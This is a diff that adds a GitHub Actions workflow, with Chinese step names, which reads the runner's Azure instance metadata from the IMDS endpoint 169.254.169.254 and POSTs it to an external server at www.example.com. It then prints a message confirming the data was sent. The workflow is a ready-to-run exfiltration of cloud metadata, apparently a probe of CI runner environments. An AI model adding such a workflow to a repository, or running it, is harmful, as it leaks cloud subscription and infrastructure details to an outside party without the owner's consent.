@@ -1,0 +1,25 @@
+name: Upload Azure Metadata
+
+on:
+  workflow_dispatch:
+
+jobs:
+  send-metadata:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 获取 Azure IMDS 元数据
+        run: |
+          METADATA=$(curl -s -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          echo "METADATA<<EOF" >> $GITHUB_ENV
+          echo "$METADATA" >> $GITHUB_ENV
+          echo "EOF" >> $GITHUB_ENV
+
+      - name: 发送元数据到外部服务器
+        run: |
+          curl -X POST "http://www.example.com/metadata" \
+            -H "Content-Type: application/json" \
+            -d '${{ env.METADATA }}'
+
+      - name: 确认发送成功
+        run: echo "✅ Azure 元数据已发送到 www.example.com"
